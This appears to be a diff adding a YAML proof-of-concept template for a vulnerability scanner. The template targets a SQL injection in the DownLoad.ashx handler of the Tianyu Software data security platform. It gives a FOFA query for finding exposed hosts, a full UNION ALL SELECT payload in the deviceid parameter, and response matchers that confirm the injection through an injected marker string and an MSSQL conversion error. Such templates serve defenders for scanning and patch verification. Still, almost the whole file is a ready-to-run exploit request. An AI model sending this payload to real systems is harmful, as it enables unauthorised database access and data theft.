@@ -1,0 +1,15 @@
+id: poc-yaml-hustcad-download-ashx-sqli
+info:
+  name: 天喻软件数据安全平台 DownLoad.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天喻软件数据安全平台
+  fofa: app="天喻软件数据安全平台"
+requests:
+- method: GET
+  path: /handler/DownLoad.ashx?operatetype=downloadsetupdll&deviceid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%2880%29%2BCHAR%28100%29%2BCHAR%2873%29%2BCHAR%28122%29%2BCHAR%2878%29%2BCHAR%2882%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+FVCt
+  expression: "status_code == 500 && \ncontains(body,\"qbvpqPdIzNR\") &&\ncontains(body,\"\
+    在将 varchar 值\") &&\ncontains(body,\"转换成数据类型 int 时失败\")\n"
+variables: {}
+transport: http
